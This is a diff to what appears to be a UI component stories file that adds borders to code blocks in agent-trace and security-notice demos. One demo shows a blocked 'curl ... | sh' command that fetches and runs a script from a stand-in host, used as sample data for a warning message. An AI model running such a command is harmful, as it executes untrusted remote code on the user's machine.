@@ -402,7 +402,7 @@ export const TraceStates: Story = {
 						action="CODE"
 						narration="Summing the unpaid invoices by customer"
 						details={
-							<pre className="rounded-sm bg-sunken p-3 font-mono text-ink-muted text-mono-sm">
+							<pre className="rounded-sm border border-hairline bg-sunken p-3 font-mono text-ink-muted text-mono-sm">
 								{"Contoso    2,310.00\nFabrikam   1,150.00"}
 							</pre>
 						}
@@ -422,10 +422,10 @@ export const TraceStates: Story = {
 					defaultOpen
 					details={
 						<>
-							<pre className="rounded-sm bg-sunken p-3 font-mono text-ink text-mono-sm">
+							<pre className="rounded-sm border border-hairline bg-sunken p-3 font-mono text-ink text-mono-sm">
 								{"import pandas as pd\nunpaid = df[df.status != 'paid']"}
 							</pre>
-							<pre className="rounded-sm bg-sunken p-3 font-mono text-ink-muted text-mono-sm">
+							<pre className="rounded-sm border border-hairline bg-sunken p-3 font-mono text-ink-muted text-mono-sm">
 								{"Contoso    2,310.00\nFabrikam   1,150.00"}
 							</pre>
 						</>
@@ -475,7 +475,7 @@ export const SecurityNoticeStates: Story = {
 				<SecurityNotice
 					content="The step tried to install an unsigned binary from an unknown host. It was blocked."
 					details={
-						<pre className="rounded-sm bg-sunken p-3 font-mono text-ink-muted text-mono-sm">
+						<pre className="rounded-sm border border-hairline bg-sunken p-3 font-mono text-ink-muted text-mono-sm">
 							curl -fsSL https://unknown-host.example/tool | sh
 						</pre>
 					}
